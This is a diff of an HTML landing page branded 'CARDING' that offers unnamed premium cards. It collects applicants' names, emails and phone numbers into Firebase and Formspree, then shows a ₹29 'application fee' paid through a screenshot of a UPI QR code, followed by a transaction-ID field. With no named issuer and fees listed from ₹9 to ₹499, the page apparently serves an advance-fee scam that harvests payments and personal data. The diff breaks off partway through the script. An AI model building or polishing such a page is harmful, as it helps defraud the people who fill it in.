@@ -2,472 +2,101 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-
-<meta name="google-site-verification"
-content="UsXvsJ2I08EnW_0VsV3PTWZrGZu8hiWniqvkFgYBYtA">
-
-<meta name="viewport"
-content="width=device-width,initial-scale=1.0">
-
+<meta name="google-site-verification" content="UsXvsJ2I08EnW_0VsV3PTWZrGZu8hiWniqvkFgYBYtA">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>CARDING — Premium Digital Card Services</title>
 
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Playfair+Display:wght@600;700&display=swap');
 
-*{
-  box-sizing:border-box;
-  margin:0;
-  padding:0;
-}
-
-html{
-  scroll-behavior:smooth;
-}
-
-body{
-  font-family:Inter,Arial,sans-serif;
-  background:#070707;
-  color:#f6f3ed;
-  line-height:1.6;
-}
-
-a{
-  text-decoration:none;
-  color:inherit;
-}
-
-button{
-  font:inherit;
-}
-
-.container{
-  width:min(1160px,92%);
-  margin:auto;
-}
-
-nav{
-  position:sticky;
-  top:0;
-  z-index:50;
-  background:rgba(7,7,7,.94);
-  backdrop-filter:blur(16px);
-  border-bottom:1px solid #222;
-}
-
-.navin{
-  min-height:76px;
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-}
-
-.logo{
-  font-size:24px;
-  font-weight:800;
-  letter-spacing:5px;
-}
-
-.logo span{
-  color:#d6b45b;
-}
-
-.links{
-  display:flex;
-  gap:28px;
-  color:#aaa;
-  font-size:14px;
-}
-
-.links a:hover{
-  color:#fff;
-}
-
-.btn{
-  display:inline-flex;
-  align-items:center;
-  justify-content:center;
-  padding:13px 22px;
-  border-radius:999px;
-  border:1px solid #d6b45b;
-  background:linear-gradient(135deg,#e4c56e,#a77a1e);
-  color:#080808;
-  font-weight:800;
-  cursor:pointer;
-}
-
-.btn.alt{
-  background:transparent;
-  color:#eee;
-  border-color:#333;
-}
-
-.btn:disabled{
-  opacity:.6;
-}
-
-.hero{
-  min-height:calc(100vh - 76px);
-  padding:85px 0;
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:50px;
-  align-items:center;
-}
-
-.eyebrow{
-  color:#d6b45b;
-  text-transform:uppercase;
-  letter-spacing:4px;
-  font-size:12px;
-  font-weight:700;
-  margin-bottom:18px;
-}
-
-h1{
-  font-family:"Playfair Display",serif;
-  font-size:clamp(52px,7vw,92px);
-  line-height:.98;
-  margin-bottom:24px;
-}
-
-h1 em{
-  font-style:normal;
-  color:#d6b45b;
-}
-
-.hero p{
-  color:#aaa69e;
-  max-width:590px;
-  font-size:17px;
-  margin-bottom:30px;
-}
-
-.actions{
-  display:flex;
-  gap:14px;
-  flex-wrap:wrap;
-}
-
-.heroimg img,
-.featureimg img{
-  width:100%;
-  object-fit:cover;
-  border-radius:28px;
-  border:1px solid #222;
-  box-shadow:0 30px 90px #000;
-}
-
-.heroimg img{
-  height:500px;
-}
-
-.stats{
-  display:grid;
-  grid-template-columns:repeat(3,1fr);
-  gap:14px;
-  margin-top:34px;
-}
-
-.stat{
-  padding:18px;
-  border:1px solid #222;
-  border-radius:18px;
-  background:#0c0c0c;
-}
-
-.stat b{
-  display:block;
-  font-size:23px;
-}
-
-.stat span{
-  font-size:12px;
-  color:#8e8b84;
-}
-
-section{
-  padding:90px 0;
-}
-
-.sectionhead{
-  margin-bottom:38px;
-}
-
-.sectionhead h2,
-.featuretitle{
-  font-family:"Playfair Display",serif;
-  font-size:48px;
-  line-height:1.1;
-}
-
-.sectionhead p{
-  color:#99958d;
-  max-width:620px;
-  margin-top:14px;
-}
-
-.grid{
-  display:grid;
-  grid-template-columns:repeat(3,1fr);
-  gap:20px;
-}
-
-.card{
-  background:#101010;
-  border:1px solid #222;
-  border-radius:24px;
-  overflow:hidden;
-  transition:.3s;
-}
-
-.card:hover{
-  transform:translateY(-6px);
-  border-color:#d6b45b;
-}
-
-.card img{
-  width:100%;
-  height:210px;
-  object-fit:cover;
-}
-
-.cardbody{
-  padding:23px;
-}
-
-.cardbody h3{
-  font-size:20px;
-  margin-bottom:7px;
-}
-
-.cardbody p{
-  color:#96928a;
-  font-size:14px;
-  margin-bottom:17px;
-}
-
-.features{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:24px;
-}
-
-.featureimg img{
-  height:100%;
-  min-height:450px;
-}
-
-.featurelist{
-  display:grid;
-  gap:14px;
-}
-
-.feature{
-  padding:24px;
-  border:1px solid #222;
-  border-radius:20px;
-  background:#0d0d0d;
-}
-
-.icon{
-  color:#d6b45b;
-  font-size:23px;
-}
-
-.feature p{
-  color:#929088;
-  font-size:14px;
-}
-
-.cta{
-  border:1px solid rgba(214,180,91,.35);
-  border-radius:30px;
-  padding:55px;
-  background:#101010;
-  text-align:center;
-}
-
-.cta h2{
-  font-family:"Playfair Display",serif;
-  font-size:50px;
-  margin-bottom:12px;
-}
-
-.cta p{
-  color:#99958d;
-  margin:0 auto 24px;
-  max-width:620px;
-}
-
-.formbox{
-  max-width:700px;
-  margin:30px auto 0;
-  padding:28px;
-  border:1px solid #222;
-  border-radius:24px;
-  background:#0d0d0d;
-  text-align:left;
-}
-
-input,
-select{
-  width:100%;
-  padding:14px 16px;
-  margin:8px 0 14px;
-  border-radius:12px;
-  border:1px solid #292929;
-  background:#080808;
-  color:#fff;
-  outline:none;
-}
-
-input:focus,
-select:focus{
-  border-color:#d6b45b;
-}
-
-label{
-  font-size:13px;
-  color:#aaa;
-}
-
-.status{
-  margin-top:14px;
-  color:#d6b45b;
-  font-size:14px;
-}
-
-.note{
-  font-size:11px;
-  color:#66625b;
-  margin-top:12px;
-}
-
-.details{
-  display:grid;
-  grid-template-columns:repeat(3,1fr);
-  gap:18px;
-}
-
-.detail{
-  background:#0d0d0d;
-  border:1px solid #222;
-  border-radius:20px;
-  padding:25px;
-}
-
-.detail h3{
-  color:#d6b45b;
-  margin-bottom:8px;
-}
-
-.detail p{
-  color:#99958d;
-  font-size:14px;
-}
-
-#application-fee{
-  display:none;
-}
-
-.fee-box{
-  max-width:700px;
-  margin:auto;
-  background:#0d0d0d;
-  border:1px solid rgba(214,180,91,.35);
-  border-radius:25px;
-  padding:32px;
-  text-align:center;
-}
-
-.fee-amount{
-  font-size:48px;
-  font-weight:800;
-  color:#d6b45b;
-  margin:10px 0 20px;
-}
-
-.payment-box{
-  display:none;
-  margin-top:25px;
-  padding:25px;
-  background:#080808;
-  border:1px solid #222;
-  border-radius:20px;
-  text-align:left;
-}
-
-.payment-note{
-  color:#8e8b84;
-  font-size:13px;
-  margin-bottom:18px;
-}
-
-.warning{
-  padding:14px;
-  margin-top:15px;
-  border-radius:12px;
-  background:#17130b;
-  border:1px solid rgba(214,180,91,.2);
-  color:#aaa;
-  font-size:12px;
-}
-
-.qr-image{
-  display:block;
-  width:280px;
-  max-width:100%;
-  margin:20px auto;
-  padding:8px;
-  background:#fff;
-  border-radius:12px;
-}
-
-footer{
-  padding:30px 0;
-  border-top:1px solid #222;
-  color:#77736b;
-  font-size:13px;
-  display:flex;
-  justify-content:space-between;
-}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:Inter,Arial,sans-serif;background:#070707;color:#f6f3ed;line-height:1.6}
+a{text-decoration:none;color:inherit}
+button{font:inherit}
+.container{width:min(1160px,92%);margin:auto}
+
+nav{position:sticky;top:0;z-index:50;background:rgba(7,7,7,.94);backdrop-filter:blur(16px);border-bottom:1px solid #222}
+.navin{min-height:76px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:24px;font-weight:800;letter-spacing:5px}
+.logo span{color:#d6b45b}
+.links{display:flex;gap:28px;color:#aaa;font-size:14px}
+.links a:hover{color:#fff}
+
+.btn{display:inline-flex;align-items:center;justify-content:center;padding:13px 22px;border-radius:999px;border:1px solid #d6b45b;background:linear-gradient(135deg,#e4c56e,#a77a1e);color:#080808;font-weight:800;cursor:pointer}
+.btn.alt{background:transparent;color:#eee;border-color:#333}
+.btn:disabled{opacity:.6;cursor:not-allowed}
+
+.hero{min-height:calc(100vh - 76px);padding:85px 0;display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}
+.eyebrow{color:#d6b45b;text-transform:uppercase;letter-spacing:4px;font-size:12px;font-weight:700;margin-bottom:18px}
+h1{font-family:"Playfair Display",serif;font-size:clamp(52px,7vw,92px);line-height:.98;margin-bottom:24px}
+h1 em{font-style:normal;color:#d6b45b}
+.hero p{color:#aaa69e;max-width:590px;font-size:17px;margin-bottom:30px}
+.actions{display:flex;gap:14px;flex-wrap:wrap}
+
+.heroimg img,.featureimg img{width:100%;object-fit:cover;border-radius:28px;border:1px solid #222;box-shadow:0 30px 90px #000}
+.heroimg img{height:500px}
+
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:34px}
+.stat{padding:18px;border:1px solid #222;border-radius:18px;background:#0c0c0c}
+.stat b{display:block;font-size:23px}
+.stat span{font-size:12px;color:#8e8b84}
+
+section{padding:90px 0}
+.sectionhead{margin-bottom:38px}
+.sectionhead h2,.featuretitle{font-family:"Playfair Display",serif;font-size:48px;line-height:1.1}
+.sectionhead p{color:#99958d;max-width:620px;margin-top:14px}
+
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.card{background:#101010;border:1px solid #222;border-radius:24px;overflow:hidden;transition:.3s}
+.card:hover{transform:translateY(-6px);border-color:#d6b45b}
+.card img{width:100%;height:210px;object-fit:cover}
+.cardbody{padding:23px}
+.cardbody h3{font-size:20px;margin-bottom:7px}
+.cardbody p{color:#96928a;font-size:14px;margin-bottom:17px}
+
+.features{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.featureimg img{height:100%;min-height:450px}
+.featurelist{display:grid;gap:14px}
+.feature{padding:24px;border:1px solid #222;border-radius:20px;background:#0d0d0d}
+.icon{color:#d6b45b;font-size:23px}
+.feature p{color:#929088;font-size:14px}
+
+.cta{border:1px solid rgba(214,180,91,.35);border-radius:30px;padding:55px;background:#101010;text-align:center}
+.cta h2{font-family:"Playfair Display",serif;font-size:50px;margin-bottom:12px}
+.cta p{color:#99958d;margin:0 auto 24px;max-width:620px}
+
+.formbox{max-width:700px;margin:30px auto 0;padding:28px;border:1px solid #222;border-radius:24px;background:#0d0d0d;text-align:left}
+input,select{width:100%;padding:14px 16px;margin:8px 0 14px;border-radius:12px;border:1px solid #292929;background:#080808;color:#fff;outline:none}
+input:focus,select:focus{border-color:#d6b45b}
+label{font-size:13px;color:#aaa}
+.status{margin-top:14px;color:#d6b45b;font-size:14px}
+.note{font-size:11px;color:#66625b;margin-top:12px}
+
+.details{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.detail{background:#0d0d0d;border:1px solid #222;border-radius:20px;padding:25px}
+.detail h3{color:#d6b45b;margin-bottom:8px}
+.detail p{color:#99958d;font-size:14px}
+
+#application-fee{display:none}
+.fee-box{max-width:700px;margin:auto;background:#0d0d0d;border:1px solid rgba(214,180,91,.35);border-radius:25px;padding:32px;text-align:center}
+.fee-amount{font-size:48px;font-weight:800;color:#d6b45b;margin:10px 0 20px}
+.payment-box{display:none;margin-top:25px;padding:25px;background:#080808;border:1px solid #222;border-radius:20px;text-align:left}
+.payment-note{color:#8e8b84;font-size:13px;margin-bottom:18px}
+.warning{padding:14px;margin-top:15px;border-radius:12px;background:#17130b;border:1px solid rgba(214,180,91,.2);color:#aaa;font-size:12px}
+.qr-image{display:block;width:280px;max-width:100%;margin:20px auto;padding:8px;background:#fff;border-radius:12px}
+
+footer{padding:30px 0;border-top:1px solid #222;color:#77736b;font-size:13px;display:flex;justify-content:space-between}
 
 @media(max-width:800px){
-
-  .links{
-    display:none;
-  }
-
-  .hero{
-    grid-template-columns:1fr;
-    padding-top:55px;
-  }
-
-  .heroimg img{
-    height:340px;
-  }
-
-  .grid,
-  .features,
-  .details{
-    grid-template-columns:1fr;
-  }
-
-  .stats{
-    grid-template-columns:1fr;
-  }
-
-  .sectionhead h2{
-    font-size:42px;
-  }
-
-  .cta h2{
-    font-size:38px;
-  }
-
-  footer{
-    display:block;
-  }
+.links{display:none}
+.hero{grid-template-columns:1fr;padding-top:55px}
+.heroimg img{height:340px}
+.grid,.features,.details{grid-template-columns:1fr}
+.stats{grid-template-columns:1fr}
+.sectionhead h2{font-size:42px}
+.cta h2{font-size:38px}
+footer{display:block}
 }
 </style>
 </head>
@@ -476,934 +105,429 @@ footer{
 
 <nav>
 <div class="container navin">
-
-<a class="logo" href="#">
-CARD<span>ING</span>
-</a>
-
+<a class="logo" href="#">CARD<span>ING</span></a>
 <div class="links">
 <a href="#cards">Cards</a>
 <a href="#features">Features</a>
 <a href="#security">Security</a>
 <a href="#apply">Apply</a>
 </div>
-
-<a class="btn" href="#cards">
-Get Started
-</a>
-
+<a class="btn" href="#cards">Get Started</a>
 </div>
 </nav>
 
-
 <section class="container hero">
-
 <div>
-
-<div class="eyebrow">
-Premium Digital Card Experience
-</div>
-
-<h1>
-Cards, made <em>elegant.</em>
-</h1>
-
-<p>
-Discover a modern card-services experience designed around simplicity, security and a premium digital feel.
-</p>
-
+<div class="eyebrow">Premium Digital Card Experience</div>
+<h1>Cards, made <em>elegant.</em></h1>
+<p>Discover a modern card-services experience designed around simplicity, security and a premium digital feel.</p>
 <div class="actions">
-
-<a class="btn" href="#cards">
-Explore Cards
-</a>
-
-<a class="btn alt" href="#features">
-Learn More
-</a>
-
+<a class="btn" href="#cards">Explore Cards</a>
+<a class="btn alt" href="#features">Learn More</a>
 </div>
-
-
 <div class="stats">
-
-<div class="stat">
-<b>24/7</b>
-<span>Digital access</span>
+<div class="stat"><b>24/7</b><span>Digital access</span></div>
+<div class="stat"><b>Secure</b><span>Protection-first design</span></div>
+<div class="stat"><b>Fast</b><span>Simple experience</span></div>
 </div>
-
-<div class="stat">
-<b>Secure</b>
-<span>Protection-first design</span>
 </div>
-
-<div class="stat">
-<b>Fast</b>
-<span>Simple experience</span>
-</div>
-
-</div>
-
-</div>
-
-
-<div class="heroimg">
-<img src="hero.jpg" alt="Premium card service">
-</div>
-
+<div class="heroimg"><img src="hero.jpg" alt="Premium card service"></div>
 </section>
-
 
 <section id="cards">
-
 <div class="container">
-
 <div class="sectionhead">
-
-<div class="eyebrow">
-Our Cards
+<div class="eyebrow">Our Cards</div>
+<h2>Choose your style.</h2>
+<p>Select the card experience that matches your everyday needs.</p>
 </div>
-
-<h2>
-Choose your style.
-</h2>
-
-<p>
-Select the card experience that matches your everyday needs.
-</p>
-
-</div>
-
-
 <div class="grid">
 
-
 <div class="card">
-
 <img src="cards.png" alt="Everyday Card">
-
 <div class="cardbody">
-
-<h3>
-Everyday Card
-</h3>
-
-<p>
-For everyday digital payment needs.
-</p>
-
-<a class="btn" href="#apply">
-Apply Now
-</a>
-
+<h3>Everyday Card</h3>
+<p>For everyday digital payment needs.</p>
+<a class="btn" href="#apply">Apply Now</a>
 </div>
-
 </div>
-
 
 <div class="card">
-
 <img src="cards.png" alt="Signature Card">
-
 <div class="cardbody">
-
-<h3>
-Signature Card
-</h3>
-
-<p>
-A premium option with an elevated experience.
-</p>
-
-<a class="btn" href="#apply">
-Apply Now
-</a>
-
+<h3>Signature Card</h3>
+<p>A premium option with an elevated experience.</p>
+<a class="btn" href="#apply">Apply Now</a>
 </div>
-
 </div>
-
 
 <div class="card">
-
 <img src="cards.png" alt="Elite Card">
-
 <div class="cardbody">
-
-<h3>
-Elite Card
-</h3>
-
-<p>
-Designed for customers looking for a premium experience.
-</p>
-
-<a class="btn" href="#apply">
-Apply Now
-</a>
-
+<h3>Elite Card</h3>
+<p>Designed for customers looking for a premium experience.</p>
+<a class="btn" href="#apply">Apply Now</a>
 </div>
-
 </div>
-
 
 </div>
 </div>
 </section>
-
 
 <section id="features">
-
 <div class="container features">
-
-<div class="featureimg">
-
-<img src="security.png" alt="Security">
-
-</div>
-
-
+<div class="featureimg"><img src="security.png" alt="Security"></div>
 <div>
-
-<div class="eyebrow">
-Why CARDING
-</div>
-
-<h2 class="featuretitle">
-Simple. Premium. Secure.
-</h2>
-
+<div class="eyebrow">Why CARDING</div>
+<h2 class="featuretitle">Simple. Premium. Secure.</h2>
 <br>
-
 <div class="featurelist">
 
-
 <div class="feature">
-
 <div class="icon">◆</div>
-
-<h3>
-Premium Experience
-</h3>
-
-<p>
-A clean and modern digital experience.
-</p>
-
+<h3>Premium Experience</h3>
+<p>A clean and modern digital experience.</p>
 </div>
 
-
 <div class="feature">
-
 <div class="icon">◆</div>
-
-<h3>
-Simple Application
-</h3>
-
-<p>
-Apply using a short and easy application form.
-</p>
-
+<h3>Simple Application</h3>
+<p>Apply using a short and easy application form.</p>
 </div>
 
-
 <div class="feature">
-
 <div class="icon">◆</div>
-
-<h3>
-Privacy First
-</h3>
-
-<p>
-Never submit card numbers, CVV, PIN, OTP or passwords through this website.
-</p>
-
+<h3>Privacy First</h3>
+<p>Never submit card numbers, CVV, PIN, OTP or passwords through this website.</p>
 </div>
-
 
 </div>
 </div>
 </div>
 </section>
-
 
 <section id="security">
-
 <div class="container">
-
 <div class="cta">
-
-<div class="eyebrow">
-Security
+<div class="eyebrow">Security</div>
+<h2>Your information matters.</h2>
+<p>We keep the application experience simple and avoid collecting sensitive payment credentials through this form.</p>
+<a class="btn" href="#apply">Start Application</a>
 </div>
-
-<h2>
-Your information matters.
-</h2>
-
-<p>
-We keep the application experience simple and avoid collecting sensitive payment credentials through this form.
-</p>
-
-<a class="btn" href="#apply">
-Start Application
-</a>
-
-</div>
-
 </div>
 </section>
-
 
 <section id="details">
-
 <div class="container">
-
 <div class="sectionhead">
-
-<div class="eyebrow">
-Card Details
+<div class="eyebrow">Card Details</div>
+<h2>Available Options</h2>
+<p>Indicative application/service fees are shown below. Any final applicable charge should be clearly shown before payment.</p>
 </div>
-
-<h2>
-Available Options
-</h2>
-
-<p>
-Indicative application/service fees are shown below. Any final applicable charge should be clearly shown before payment.
-</p>
-
-</div>
-
 
 <div class="details">
-
-
-<div class="detail">
-
-<h3>
-Everyday
-</h3>
-
-<p>
-Indicative fee: ₹9
-</p>
-
+<div class="detail"><h3>Everyday</h3><p>Indicative fee: ₹9</p></div>
+<div class="detail"><h3>Signature</h3><p>Indicative fee: ₹29</p></div>
+<div class="detail"><h3>Elite</h3><p>Indicative fee: ₹49</p></div>
 </div>
-
-
-<div class="detail">
-
-<h3>
-Signature
-</h3>
-
-<p>
-Indicative fee: ₹29
-</p>
-
-</div>
-
-
-<div class="detail">
-
-<h3>
-Elite
-</h3>
-
-<p>
-Indicative fee: ₹49
-</p>
-
-</div>
-
-
-</div>
-
 
 <div class="formbox">
-
-<strong>
-Available Fee Options
-</strong>
-
-<p style="color:#999;margin-top:8px">
-₹9 • ₹19 • ₹29 • ₹39 • ₹49 • ₹99 • ₹199 • ₹399 • ₹499
-</p>
-
-<p class="note">
-Final applicable fee must be displayed clearly before payment.
-</p>
-
+<strong>Available Fee Options</strong>
+<p style="color:#999;margin-top:8px">₹9 • ₹19 • ₹29 • ₹39 • ₹49 • ₹99 • ₹199 • ₹399 • ₹499</p>
+<p class="note">Final applicable fee must be displayed clearly before payment.</p>
 </div>
-
 </div>
 </section>
-
 
 <section id="apply">
-
 <div class="container">
-
 <div class="cta">
+<div class="eyebrow">Application</div>
+<h2>Apply for your card.</h2>
+<p>Enter your basic details below to submit an application.</p>
 
-<div class="eyebrow">
-Application
-</div>
+<form id="application-form" action="https://formspree.io/f/mqpaawon" method="POST" class="formbox">
 
-<h2>
-Apply for your card.
-</h2>
+<label for="name">Full Name</label>
+<input type="text" id="name" name="name" placeholder="Enter your full name" required>
 
-<p>
-Enter your basic details below to submit an application.
-</p>
+<label for="email">Email</label>
+<input type="email" id="email" name="email" placeholder="Enter your email" required>
 
+<label for="mobile">Mobile Number</label>
+<input type="tel" id="mobile" name="mobile" placeholder="Enter your mobile number" pattern="[0-9]{10}" maxlength="10" required>
 
-<form
-id="application-form"
-action="https://formspree.io/f/mqpaawon"
-method="POST"
-class="formbox"
->
-
-
-<label for="name">
-Full Name
-</label>
-
-<input
-type="text"
-id="name"
-name="name"
-placeholder="Enter your full name"
-required
->
-
-
-<label for="email">
-Email
-</label>
-
-<input
-type="email"
-id="email"
-name="email"
-placeholder="Enter your email"
-required
->
-
-
-<label for="mobile">
-Mobile Number
-</label>
-
-<input
-type="tel"
-id="mobile"
-name="mobile"
-placeholder="Enter your mobile number"
-pattern="[0-9]{10}"
-maxlength="10"
-required
->
-
-
-<label for="card">
-Select Card
-</label>
-
-<select
-id="card"
-name="card"
-required
->
-
-<option value="">
-Select a card
-</option>
-
-<option value="Everyday Card">
-Everyday Card
-</option>
-
-<option value="Signature Card">
-Signature Card
-</option>
-
-<option value="Elite Card">
-Elite Card
-</option>
-
+<label for="card">Select Card</label>
+<select id="card" name="card" required>
+<option value="">Select a card</option>
+<option value="Everyday Card">Everyday Card</option>
+<option value="Signature Card">Signature Card</option>
+<option value="Elite Card">Elite Card</option>
 </select>
 
-
-<button
-class="btn"
-type="submit"
-id="submitBtn"
->
-Submit Application
-</button>
-
-
-<div
-id="form-status"
-class="status">
-</div>
-
-
-<p class="note">
-Do not enter card numbers, CVV, PIN, OTP or passwords.
-</p>
+<button class="btn" type="submit" id="submitBtn">Submit Application</button>
+<div id="form-status" class="status"></div>
+<p class="note">Do not enter card numbers, CVV, PIN, OTP or passwords.</p>
 
 </form>
-
 </div>
 </div>
 </section>
-
-
-<!-- APPLICATION FEE -->
 
 <section id="application-fee">
-
 <div class="container">
-
 <div class="fee-box">
-
-<div class="eyebrow">
-Application Fee
-</div>
-
-<h2>
-Continue your application
-</h2>
-
-<div class="fee-amount">
-₹29
-</div>
-
-<p style="color:#999">
-Application/service fee shown for this flow.
-</p>
-
+<div class="eyebrow">Application Fee</div>
+<h2>Continue your application</h2>
+<div class="fee-amount">₹29</div>
+<p style="color:#999">Application/service fee shown for this flow.</p>
 <br>
 
+<button class="btn" type="button" onclick="openPayment()">Continue to Payment</button>
 
-<button
-class="btn"
-type="button"
-onclick="openPayment()"
->
-Continue to Payment
-</button>
-
-
-<!-- PAYMENT -->
-
-<div
-id="payment-box"
-class="payment-box"
->
-
-<h3>
-Payment
-</h3>
-
-<p class="payment-note">
-Use the displayed payment method and keep your transaction ID for verification.
-</p>
-
-
-<!-- QR -->
+<div id="payment-box" class="payment-box">
+<h3>Payment</h3>
+<p class="payment-note">Use the displayed payment method and keep your transaction ID for verification.</p>
 
 <div style="text-align:center">
-
-<img
-src="Screenshot_20260921-182613~2.jpg"
-alt="UPI Payment QR Code"
-class="qr-image"
->
-
+<img src="Screenshot_20260921-182613~2.jpg" alt="UPI Payment QR Code" class="qr-image">
 </div>
 
-
 <p style="text-align:center;color:#aaa;font-size:13px">
-
 Application Fee:
-
-<strong style="color:#d6b45b">
-₹29
-</strong>
-
+<strong style="color:#d6b45b">₹29</strong>
 </p>
-
 
 <br>
 
+<label for="utr">UTR / Transaction ID</label>
+<input type="text" id="utr" placeholder="Enter transaction ID">
 
-<label for="utr">
-UTR / Transaction ID
-</label>
+<button class="btn" type="button" onclick="submitPayment()">Submit Payment Details</button>
 
-<input
-type="text"
-id="utr"
-placeholder="Enter transaction ID"
->
-
-
-<button
-class="btn"
-type="button"
-onclick="submitPayment()"
->
-Submit Payment Details
-</button>
-
-
-<div
-id="payment-status"
-class="status">
-</div>
-
+<div id="payment-status" class="status"></div>
 
 <div class="warning">
-
 This website does not collect card numbers, CVV, PIN or OTP. The displayed QR/UTR flow is a payment-information UI; actual payment processing and verification should be handled through an authorized payment provider.
-
-</div>
-
-</div>
-
 </div>
 </div>
-
+</div>
+</div>
 </section>
 
-
 <footer class="container">
-
-<div>
-© 2026 CARDING
-</div>
-
-<div>
-Premium Digital Card Services
-</div>
-
+<div>© 2026 CARDING</div>
+<div>Premium Digital Card Services</div>
 </footer>
 
-
-<!-- FIREBASE + FORM SUBMISSION -->
+<!-- FIREBASE + FORM SUBMISSION: ONLY ONE SCRIPT -->
 
 <script type="module">
 
-import {
-initializeApp
-}
+import { initializeApp }
 from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
 
-
 import {
-getFirestore,
-collection,
-addDoc,
-serverTimestamp
+  getFirestore,
+  collection,
+  addDoc,
+  serverTimestamp
 }
 from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+
+import {
+  getAuth,
+  signInAnonymously
+}
+from "https://www.gstatic.com/firebasejs/12.1.0/firebase-auth.js";
 
 
 /* FIREBASE CONFIG */
 
 const firebaseConfig = {
-
-apiKey:
-"AIzaSyC8-pN9Jg4BXOH9dHsWyH_wHjjr_iXekox",
-
-authDomain:
-"carding-website-87a10.firebaseapp.com",
-
-projectId:
-"carding-website-87a10",
-
-storageBucket:
-"carding-website-87a10.firebasestorage.app",
-
-messagingSenderId:
-"105806699328",
-
-appId:
-"1:105806699328:web:cb43d3d46e42d256655"
-
+  apiKey: "AIzaSyC8-pN9Jg4BX0H9Os2HsY_wHjjr_jXexok",
+  authDomain: "carding-website-87a10.firebaseapp.com",
+  projectId: "carding-website-87a10",
+  storageBucket: "carding-website-87a10.firebasestorage.app",
+  messagingSenderId: "1058006993928",
+  appId: "1:1058006993928:web:cb43cdd346e42d256655bd",
+  measurementId: "G-R7P99KNG19"
 };
 
 
-const app =
-initializeApp(firebaseConfig);
+/* FIREBASE START */
 
-const db =
-getFirestore(app);
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+const auth = getAuth(app);
+
+
+/* ANONYMOUS LOGIN */
+
+try {
+  await signInAnonymously(auth);
+  console.log("Firebase anonymous login successful");
+} catch (error) {
+  console.error("Firebase Auth Error:", error);
+}
 
 
 /* ELEMENTS */
 
-const form =
-document.getElementById(
-"application-form"
-);
-
-const status =
-document.getElementById(
-"form-status"
-);
-
-const submitBtn =
-document.getElementById(
-"submitBtn"
-);
+const form = document.getElementById("application-form");
+const status = document.getElementById("form-status");
+const submitBtn = document.getElementById("submitBtn");
 
 
 /* FORM SUBMIT */
 
-form.addEventListener(
-"submit",
-async function(e){
+form.addEventListener("submit", async function(e) {
 
-e.preventDefault();
+  e.preventDefault();
 
+  submitBtn.disabled = true;
+  submitBtn.textContent = "Submitting...";
+  status.textContent = "";
 
-submitBtn.disabled =
-true;
+  const name = document.getElementById("name").value.trim();
+  const email = document.getElementById("email").value.trim();
+  const mobile = document.getElementById("mobile").value.trim();
+  const card = document.getElementById("card").value;
 
-submitBtn.textContent =
-"Submitting...";
+  try {
 
-status.textContent =
-"";
+    /* MAKE SURE USER IS ANONYMOUSLY SIGNED IN */
 
+    if (!auth.currentUser) {
+      await signInAnonymously(auth);
+    }
 
-const name =
-document.getElementById(
-"name"
-).value.trim();
-
-
-const email =
-document.getElementById(
-"email"
-).value.trim();
+    const uid = auth.currentUser.uid;
 
 
-const mobile =
-document.getElementById(
-"mobile"
-).value.trim();
+    /* SAVE APPLICATION */
+
+    const applicationRef = await addDoc(
+      collection(db, "applications"),
+      {
+        name: name,
+        email: email,
+        mobile: mobile,
+        card: card,
+        utr: "",
+        status: "Pending",
+        createdAt: serverTimestamp(),
+        uid: uid
+      }
+    );
 
 
-const card =
-document.getElementById(
-"card"
-).value;
+    /* SEND APPLICATION TO FORMSPREE */
+
+    const response = await fetch(
+      form.action,
+      {
+        method: "POST",
+        body: new FormData(form),
+        headers: {
+          "Accept": "application/json"
+        }
+      }
+    );
 
 
-try{
+    if (response.ok) {
 
+      /*
+       * APPLICATION ID IS PASSED TO WAITING PAGE
+       */
 
-/* SAVE APPLICATION TO FIRESTORE */
+      window.location.href =
+        "waiting.html?id=" +
+        encodeURIComponent(applicationRef.id);
 
-await addDoc(
+    } else {
 
-collection(
-db,
-"applications"
-),
+      status.textContent =
+        "Application saved. Email notification failed.";
 
-{
+    }
 
-name:name,
+  } catch (error) {
 
-email:email,
+    console.error("Application Error:", error);
 
-mobile:mobile,
+    status.textContent =
+      "Application failed: " +
+      (error.code || error.message);
 
-card:card,
+  }
 
-utr:"",
-
-status:"Pending",
-
-createdAt:
-serverTimestamp()
-
-}
-
-);
-
-
-/* SEND APPLICATION TO FORMSPREE */
-
-const response =
-await fetch(
-
-form.action,
-
-{
-
-method:"POST",
-
-body:
-new FormData(form),
-
-headers:{
-"Accept":
-"application/json"
-}
-
-}
-
-);
-
-
-if(response.ok){
-
-status.textContent =
-"Application submitted successfully.";
-
-form.reset();
-
-showApplicationFee();
-
-}else{
-
-status.textContent =
-"Application saved. Email notification failed.";
-
-}
-
-
-}catch(error){
-
-console.error(
-"Application Error:",
-error
-);
-
-status.textContent =
-"Application failed: " +
-(error.code || error.message);
-
-}
-
-
-submitBtn.disabled =
-false;
-
-submitBtn.textContent =
-"Submit Application";
+  submitBtn.disabled = false;
+  submitBtn.textContent = "Submit Application";
 
 });
 
 
-/* SHOW FEE */
+/* APPLICATION FEE */
 
-function showApplicationFee(){
+function showApplicationFee() {
 
-const fee =
-document.getElementById(
-"application-fee"
-);
+  const fee = document.getElementById("application-fee");
 
-fee.style.display =
-"block";
+  fee.style.display = "block";
 
-
-setTimeout(
-function(){
-
-fee.scrollIntoView({
-
-behavior:"smooth",
-
-block:"start"
-
-});
-
-},
-100
-);
+  setTimeout(function() {
+    fee.scrollIntoView({
+      behavior: "smooth",
+      block: "start"
+    });
+  }, 100);
 
 }
 
 
 /* PAYMENT BOX */
 
-window.openPayment =
-function(){
+window.openPayment = function() {
 
-const payment =
-document.getElementById(
-"payment-box"
-);
+  const payment =
+    document.getElementById("payment-box");
 
-payment.style.display =
-"block";
+  payment.style.display = "block";
 
-
-setTimeout(
-function(){
-
-payment.scrollIntoView({
-
-behavior:"smooth",
-
-block:"center"
